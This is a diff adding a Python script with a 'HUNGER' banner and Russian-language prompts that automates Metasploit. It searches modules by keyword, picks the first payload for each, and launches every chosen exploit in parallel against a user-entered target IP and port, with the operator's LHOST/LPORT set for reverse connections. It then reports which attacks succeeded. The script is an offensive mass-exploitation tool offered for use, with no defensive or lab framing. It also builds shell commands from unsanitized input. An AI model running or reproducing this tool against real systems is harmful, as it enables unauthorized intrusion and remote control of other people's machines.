@@ -1,0 +1,138 @@
+import os
+import subprocess
+import re
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+def display_banner():
+    os.system("clear")
+    banner = """
+\033[38;5;214m
+██╗░░██╗██╗░░░██╗███╗░░██╗░██████╗░███████╗██████╗░
+██║░░██║██║░░░██║████╗░██║██╔════╝░██╔════╝██╔══██╗
+███████║██║░░░██║██╔██╗██║██║░░██╗░█████╗░░██████╔╝
+██╔══██║██║░░░██║██║╚████║██║░░╚██╗██╔══╝░░██╔══██╗
+██║░░██║╚██████╔╝██║░╚███║╚██████╔╝███████╗██║░░██║
+╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝
+\033[0m
+    """
+    print(banner)
+
+def search_exploits(query):
+    command = f"msfconsole -q -x 'search {query}; exit'"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    return result.stdout.splitlines()
+
+def format_exploit_output(exploits):
+    print("\nНайденные эксплойты:")
+    print(f"{' # ':<3} {'Name'}")
+    print("=" * 50)
+
+    formatted_exploits = []
+    index = 0
+    
+    for exploit in exploits:
+        match = re.search(r'(exploit/[^\s]+|auxiliary/[^\s]+)', exploit)
+        if match:
+            exploit_name = match.group(1)
+            formatted_exploits.append(exploit_name)
+            print(f"{index:<3} {exploit_name}")
+            index += 1
+    
+    return formatted_exploits
+
+def get_payloads(exploit_name):
+    command = f"msfconsole -q -x 'use {exploit_name}; show payloads; exit'"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    payloads = []
+    
+    for line in result.stdout.splitlines():
+        match = re.search(r'(payload/[^\s]+)', line)
+        if match:
+            payloads.append(match.group(1))
+    
+    return payloads
+
+def run_exploit(ip, port, lhost, lport, exploit_name):
+    print(f"\nЗапуск эксплойта {exploit_name}...")
+    
+    payloads = get_payloads(exploit_name)
+    if not payloads:
+        return (exploit_name, "error", f"{exploit_name}: Не найдены подходящие полезные нагрузки.")
+    
+    selected_payload = payloads[0]  # Выбор первой полезной нагрузки
+    print(f"Выбрана полезная нагрузка: {selected_payload}")
+
+    command = (
+        f"msfconsole -q -x 'use {exploit_name}; "
+        f"set RHOSTS {ip}; set RPORT {port}; set LHOST {lhost}; set LPORT {lport}; "
+        f"set PAYLOAD {selected_payload}; run; exit'"
+    )
+    
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    
+    output = result.stdout + result.stderr
+    time.sleep(1)
+    if "Exploit completed successfully" in output:
+        return (exploit_name, "success", f"{exploit_name}: Эксплойт успешно выполнен!")
+    elif "Exploit failed" in output or "Exploit failed" in result.stderr:
+        return (exploit_name, "failed", f"{exploit_name}: Эксплойт не удался.")
+    elif "The target is not exploitable" in output:
+        return (exploit_name, "failed", f"{exploit_name}: Цель не уязвима.")
+    else:
+        return (exploit_name, "error", f"{exploit_name}: Ошибка при запуске эксплойта - {result.stderr.strip()}")
+
+def final_report(results, start_time):
+    print("\n=== Отчет ===")
+    
+    success_count = sum(1 for result in results if result[1] == "success")
+    failed_count = sum(1 for result in results if result[1] == "failed")
+    error_count = sum(1 for result in results if result[1] == "error")
+
+    print(f"Успешные эксплойты: {success_count}")
+    print(f"Не сработавшие эксплойты: {failed_count}")
+    print(f"Ошибки при запуске эксплойтов: {error_count}")
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+    print(f"\nОбщее время выполнения программы: {elapsed_time:.2f} секунд.")
+
+def main():
+    display_banner()
+    
+    search_term = input("Введите слово для поиска в эксплойтах Metasploit: ")
+    ip = input("Введите IP-адрес цели: ")
+    port = input("Введите открытый порт цели: ")
+    lhost = input("Введите ваш LHOST (например, 192.168.152.128): ")
+    lport = input("Введите ваш LPORT (например, 4444): ")
+    
+    start_time = time.time()
+    exploits = search_exploits(search_term)
+    
+    if exploits:
+        formatted_exploits = format_exploit_output(exploits)
+        
+        use_all = input("Вы хотите запустить все эксплойты? (y/n): ").strip().lower()
+        
+        if use_all == "y":
+            selected_exploits = formatted_exploits
+        else:
+            selected_exploits = input("Введите номера эксплойтов через запятую (например, 0,1,2): ")
+            selected_exploits = [formatted_exploits[int(i.strip())] for i in selected_exploits.split(",")]
+
+        print("\nПроверка совместимости и запуск эксплойтов:")
+        
+        results = []
+        with ThreadPoolExecutor() as executor:
+            futures = {executor.submit(run_exploit, ip, port, lhost, lport, exploit): exploit for exploit in selected_exploits}
+            for future in futures:
+                result = future.result()
+                results.append(result)
+                print(result[2])
+            
+        final_report(results, start_time)
+    else:
+        print("Эксплойты не найдены.")
+
+if __name__ == "__main__":
+    main()
